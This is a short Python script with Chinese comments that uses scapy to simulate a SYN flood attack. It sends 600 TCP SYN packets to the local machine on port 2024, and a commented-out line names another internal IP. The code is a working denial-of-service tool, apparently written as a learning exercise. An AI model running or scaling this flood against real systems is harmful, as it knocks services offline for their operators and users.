# 模拟SYN Flood攻击, 发送大量SYN报文
# 17行指定了是发给Windows环境中的WLAN网口
# 24-26行设置发送给本机，端口2024，数量为600

from scapy.all import send, conf
from scapy.layers.inet import IP, TCP
from scapy.arch import get_if_addr


def syn_flood(target_ip, target_port, num_packets):
    # 构造TCP SYN数据包
    # "S"代表TCP SYN标志位，表示一个TCP连接的开始
    packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S")

    # 发送大量的TCP SYN数据包
    # verbose=0时，表示关闭所有输出信息，即不显示任何详细信息或提示
    send(packet * num_packets, verbose=0, iface="WLAN")


if __name__ == '__main__':
    # 设置目标服务器的IP地址和端口号以及要发送的数据包数量
    # target_ip = "10.12.168.125"
    # 自动获取本地IPv4地址, 测试阶段发给自己
    target_ip = get_if_addr(conf.iface)
    target_port = 2024
    num_packets = 600

    # 执行SYN Flood攻击
    syn_flood(target_ip, target_port, num_packets)
